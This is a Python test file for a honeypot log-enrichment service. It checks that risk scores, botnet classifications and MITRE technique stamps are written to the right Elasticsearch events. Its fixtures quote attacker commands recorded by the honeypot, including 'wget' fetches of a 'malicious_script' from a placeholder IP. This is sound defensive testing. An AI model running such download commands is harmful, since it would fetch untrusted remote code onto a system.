import pytest

from app.config import get_settings
from app.es.client import get_es
from app.seed.seeder import seed
from app.services.llm.schemas import EvidenceCitation
from app.services.mitre.mapper import MappedTechnique
from app.services.enrichment import write_back_enrichment

WGET_EVENT = "seed-botnet-01-008"  # wget http://198.51.100.7/malicious_script
UNAME_EVENT = "seed-botnet-01-004"  # uname -a
CONNECT_EVENT = "seed-botnet-01-000"  # cowrie.session.connect, not a command at all


async def _get_source(event_id: str) -> dict:
    doc = await get_es().get(index=get_settings().es_index, id=event_id)
    return doc["_source"]


def _rule_technique(event_id: str) -> MappedTechnique:
    return MappedTechnique(
        technique_id="T1105",
        technique_name="Ingress Tool Transfer",
        tactic="Command and Control",
        confidence=1.0,
        ai_explanation=None,
        source="rule",
        rule_id="T1105",
        observed=True,
        evidence=[EvidenceCitation(event_id=event_id, artifact="wget http://x/y.sh")],
    )


def _llm_technique(event_id: str) -> MappedTechnique:
    return MappedTechnique(
        technique_id="T1082",
        technique_name="System Information Discovery",
        tactic="Discovery",
        confidence=0.7,
        ai_explanation="Ran uname to fingerprint the host.",
        source="llm",
        rule_id=None,
        observed=False,
        evidence=[EvidenceCitation(event_id=event_id, artifact="uname -a")],
    )


@pytest.mark.asyncio
async def test_write_back_stamps_risk_and_classification_on_every_session_event() -> None:
    """risk.* and ai_classification are a session-wide verdict: every event
    in the session gets them, whether or not it was ever cited by a
    technique -- the connect event included.
    """
    await seed(reset=True)
    await write_back_enrichment(
        session_id="seed-botnet-01",
        risk_score=87,
        risk="critical",
        classification="Automated botnet dropper",
        techniques=[],
    )

    wget_src = await _get_source(WGET_EVENT)
    connect_src = await _get_source(CONNECT_EVENT)

    for src in (wget_src, connect_src):
        assert src["risk"] == {"score": 87, "level": "critical"}
        assert src["ai_classification"] == "Automated botnet dropper"


@pytest.mark.asyncio
async def test_write_back_stamps_mitre_only_for_rule_backed_techniques() -> None:
    """mitre.technique_id/tactic must land on the event cited by a
    RULE-backed mapping, and must NOT land on an event cited only by an
    LLM-inferred mapping -- stamping an inference there would make a guess
    indistinguishable from something the honeypot actually observed.
    """
    await seed(reset=True)
    await write_back_enrichment(
        session_id="seed-botnet-01",
        risk_score=87,
        risk="critical",
        classification="Automated botnet dropper",
        techniques=[_rule_technique(WGET_EVENT), _llm_technique(UNAME_EVENT)],
    )

    wget_src = await _get_source(WGET_EVENT)
    uname_src = await _get_source(UNAME_EVENT)

    assert wget_src["mitre"] == {"technique_id": "T1105", "tactic": "Command and Control"}
    assert "mitre" not in uname_src


@pytest.mark.asyncio
async def test_write_back_does_not_touch_other_sessions() -> None:
    await seed(reset=True)
    before = await _get_source("seed-recon-01-000")
    assert "risk" not in before or before.get("ai_classification") is None

    await write_back_enrichment(
        session_id="seed-botnet-01",
        risk_score=87,
        risk="critical",
        classification="Automated botnet dropper",
        techniques=[_rule_technique(WGET_EVENT)],
    )

    after = await _get_source("seed-recon-01-000")
    assert after.get("ai_classification") is None
